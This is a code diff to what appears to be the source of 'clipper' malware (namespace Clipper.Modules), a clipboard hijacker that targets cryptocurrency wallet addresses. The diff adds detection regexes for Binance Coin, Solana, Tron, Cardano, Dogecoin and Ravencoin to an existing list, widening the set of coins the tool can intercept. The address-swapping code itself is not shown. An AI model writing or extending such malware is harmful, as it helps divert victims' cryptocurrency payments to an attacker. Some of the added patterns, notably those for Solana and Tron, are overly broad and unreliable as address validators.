@@ -15,7 +15,13 @@ namespace Clipper.Modules
             {"ltc", new Regex(@"(?:^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$)") }, // Litecoin
             {"nec", new Regex(@"(?:^A[0-9a-zA-Z]{33}$)") }, // Neocoin
             {"bch", new Regex(@"^((bitcoincash:)?(q|p)[a-z0-9]{41})") }, // Bitcoin Cash
-            {"dash", new Regex(@"(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)") } // Dashcoin
+            {"dash", new Regex(@"(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)") }, // Dashcoin
+            {"bnb", new Regex(@"bnb[a-zA-Z0-9]{39}$") }, // Binance coin
+            {"sol",  new Regex(@"[a-zA-Z0-9]{44}$") }, // Solana
+            {"trx",  new Regex(@"[a-zA-Z0-9]{21,42}$")}, // Tron
+            {"ada", new Regex(@"addr[a-z0-9]{99}$") }, // Cardano
+            {"doge", new Regex(@"D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}") }, // Dogecoin
+            {"rvn", new Regex(@"RV[a-zA-Z0-9]{56}$") } // Ravencoin
         };
     }
 }
